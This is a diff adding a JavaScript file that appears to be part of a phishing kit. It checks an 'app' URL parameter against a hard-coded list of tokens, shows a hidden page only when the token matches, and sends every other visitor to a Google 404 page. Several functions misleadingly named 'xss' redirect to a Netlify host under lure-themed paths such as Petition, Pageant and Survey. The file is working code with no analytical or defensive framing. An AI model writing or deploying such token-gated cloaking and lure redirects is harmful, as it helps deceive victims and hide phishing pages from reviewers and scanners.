@@ -1,0 +1,69 @@
+function xss() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/Art/connecting?app="+ myParam;
+}
+
+function xss2() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/Pet/connecting?app="+ myParam;
+}
+
+function xss22() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/PetV2/connecting?app="+ myParam;
+}
+
+function xss3() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/Petition/connecting?app="+ myParam;
+}
+
+function xss4() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/PiPho/connecting?app="+ myParam;
+}
+
+function xss5() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/Baby/connecting?app="+ myParam;
+}
+
+function xss6() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/Pageant/connecting?app="+ myParam;
+}
+
+function xss7() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app'); 
+const myParam2 = "mactsalp"; 
+window.location = "https://"+ myParam2+".netlify.app/Survey/connecting?app="+ myParam;
+}
+
+window.onload = function CheckApp() {
+const urlParams = new URLSearchParams(window.location.search);
+const myParam = urlParams.get('app');
+var myarr = ["XXXX", "zLZMuexS","d7cMLvbU","KZms65vr","GRcWlasc","GxmzxEQn","tpLTGVUg","8c8rrvlu","4geTSKhK","s7xTcTq4","pzB24vlV","h3u7YLrz","TuZZTHjs","9OPMZqVM","S3Oy27CJ","n2TaCnwG","6b2VtjqR","5wZkARY2","4grlQYZe","EAWaYDUA","4Gjol3uU","D82GAwcU","aIx4SPLa","yk4fdmcc","6Zsv6uxQ","5mlTUath","kesW9VWM","KkRisxDv","9uGaYFxB","Ez1Iw5tk","o8GExty6","1Ahr1rJM","xV6AWpmz","ZYgYCAUo","qtEA3Z8M","GrWe5HTh","PlOeJ1u4","zLVO92cc","1ZxdvqOh","fHpjZWz6","LPBHTPwE","mPbFglhH","LGGNPEwn","7kinBsIP","Fdpe5fJZ","SEzgDgaa","atZzlZmm","wnUJQM6A","mk1CTsD1","TC55cVFM","tk3lQakt","bTAsiPmQ","R9rdAogu","pQS4bflC","GjQJGZg1","jv6moeFy","QVeB5fLG","N7n4MsUf","vRkIILdP","36dinL8s","9fNnoJuA","hpREhUCZ","TtN3QU3d","mBg4UhTJ","426HP5lk","MI6hyozP","ZAb4egJ9","ZR8n6N4p","rNrxCdrY","ceKvjmDO","gWzxZeSB","OTCxknI3","FZhfrKKz","UuJrwDP4","kqDOuwKG","k8SFZQft","pZuR664S","xGR2u433","iwtmeTzw","wT6CoT64","yvc1bR6W","wZvgsC79","DwJLa5Z8","P3fGBuNU","pnu1Q72H","3zlFQHuS","NfzuDi3Z","TbbNwO33","H6VDoJc6","Bh8PMSYO","7Cgzps8J","JjlESEhH","PwoHDDgL","KpLZKxfU","AHNSP1N8","1lUjQw7C","BG22QLeT","g4VwCmwq","BJUFcMIK","kKClF8t1","xfsCob8O","6oxfsnRF","vUltyPNA","oUbgaeYp","OzN7gMtI","UkhDOZZ3","wMQrULsh","3aRRCNag","HFrr7p1Y","LodmfhS4","pRorW9hv","GFKIPKJd","wVVFZRmq","odmNW6I8","ZkCZNVAZ","1ZRICiqt","omxsaH3O","dGbJAuRF","3qsNohDK","5vNkpOHB","UytABKFI","Fwci9qRO","jKvtUeUd","mjDuzImv","767ib35A","mck2iMiw","nLDCpbSj","5BUrFObr","m7ZDY1WE","pcY5UcVS","6dvDdKRB","mhsNPrTT","fIzA3ueL","EibpF1NP","EezAK1zi","RylxTiIg","3Um8gN1L","f1PffjJR","quvO7kSf","BZhhucVo","7kt6ESoy","bqEGmO3I","W5E4ASVK","walvtajt","9QxK6iDq","lhUCquA6","jjcWZnwr","jQUn6VRi","Zby9Wqws","NWULuAwO","3HeEb2hz","qQbCj3VC","nCxln7az","ZLOOByK1","V2ms6PMJ","e9V67i4t","bDzZAfW9","dYZJiHFL","xOPIaTOz","UqomWCfu","P6TAOjp9","oH1rtYj4","M7bLy8y1","RzIzoU94","eFUJZIjN","Rx8yc4S9","zY8UxiGy","Q2qM6Byo","HG9OIb1Z","o7yiWZYS","VoDoxyE2","8jpLD94j","7vHVZ2of","R35jEySH","OtPLkvNs","YyZK9xVL","dbuR7SrD","lPlwoZ5x","fi5rpmZf","QxCRmJ4C","mdBoe4hy","SfT8K9ON","MZKxRROR","tNChSiHS","zOjAZsFM","Brsjg1RL","ObhWIodm","2USFqxnx","1OcrTGEO","mfYL9whZ","ICx6Z6ci","5ZM5U5Ux","EBzh3vJY","Hivvnov7","hWYhTFmN","vcUWWWdA","kE6DvP7g","qM2IlGwT","bjpcfEAx","byvT7Ypx","SWgr5taR","7ueRcv2i","wi66qz6c","oCWYIgEA","i2a3YKDp","j1klk7bt","74pMonZ9","tzirwbD1","xsslURAR","x6sRZA6N","tMAaAPwY","WAiITlYY","CQVyejwq","k5mC87l2","x1g6bkMg","ePofyIoM","eSs5ZjoF","b69xZ2Ri","EhDH21uH","JmQimMQj","6GScujRJ","qBURtfEZ","yigefHUe","bRYIWJzr","18dSmCJ6","rhpZyHRV","IZ6Zzk5D","41YCxBL7","JQDhf5yy","ADDHERE", "XXXX"];
+var check = (myarr.indexOf(myParam) > -1);
+	
+	if(check){
+	  document.getElementById("page2").style.display='block';
+      document.getElementById("page1").style.display='none';
+      return false;
+	}
+	location.href = 'https://google.com/404';
+	}
